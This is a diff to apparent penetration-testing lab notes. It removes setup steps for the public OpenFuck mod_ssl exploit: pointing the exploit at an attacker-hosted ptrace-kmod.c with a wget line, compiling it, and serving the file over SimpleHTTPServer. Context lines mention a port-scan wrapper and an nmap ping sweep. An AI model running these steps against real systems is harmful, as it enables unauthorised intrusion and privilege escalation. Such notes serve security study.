@@ -1,22 +1,4 @@
-# pentest
  
-**mod_ssl 2.8.7 open ssl exploit (openfuckv2)** (https://www.exploit-db.com/exploits/764)
-
-1. Change location for **ptrace-kmod.c**
-at about line 672 - update download location for ptrace-kmod.c file. Ideally, you can host this file on your webserver (eg. attacking machine SimpleHTTPServer) so that when you execute the exploit it will retrieve this dependency to run successfully.
-`wget http://your-attacking-ipaddress/ptrace-kmod.c;`
-
-2. install libssl-dev
-`apt-get install libssl-dev`
-
-3. compile code
-`gcc -o openfuck openfuckV2.c -lcrypto`
-
-4. In your ptrace-kmod.c directory start webserver
-`python -m SimpleHTTPServer 80`
-
----
-
 **Onetwopunch.sh** (https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh) Wrapper for unicornscan (fast port scan) and nmap (vuln script scan)
 1. ping sweep for online hosts into list
 `nmap -v -sn 10.11.1-254 -oG all-hosts.txt`
